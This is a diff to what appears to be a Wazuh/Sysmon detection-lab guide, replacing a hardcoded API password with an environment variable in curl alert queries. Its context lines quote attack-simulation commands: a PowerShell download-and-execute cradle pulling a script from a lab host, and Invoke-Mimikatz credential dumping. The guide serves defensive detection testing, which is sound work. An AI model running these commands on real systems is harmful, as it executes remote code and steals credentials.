@@ -48,7 +48,7 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.3.5:80
 **Wazuh (VM1) - Check Alerts:**
 ```bash
 # Query Wazuh API for Sysmon Event ID 1 (Process Creation)
-curl -k -u wazuh:StrongPassword123! \
+curl -k -u wazuh:${WAZUH_PASSWORD} \
   "https://10.0.2.4:55000/alerts?rule.groups=sysmon&winlog.event_id=1&limit=10"
 
 # Expected Rule IDs: 100001-100008 (LOLBin detection)
@@ -124,7 +124,7 @@ Invoke-Mimikatz -DumpCreds
 **Critical Alert - Level 12:**
 ```bash
 # Wazuh API - Critical LSASS alerts
-curl -k -u wazuh:StrongPassword123! \
+curl -k -u wazuh:${WAZUH_PASSWORD} \
   "https://10.0.2.4:55000/alerts?rule.level=12&rule.groups=sysmon&limit=20"
 
 # Expected: rule.id 100030/100031 with granted_access 0x1010 or 0x1F0FFF
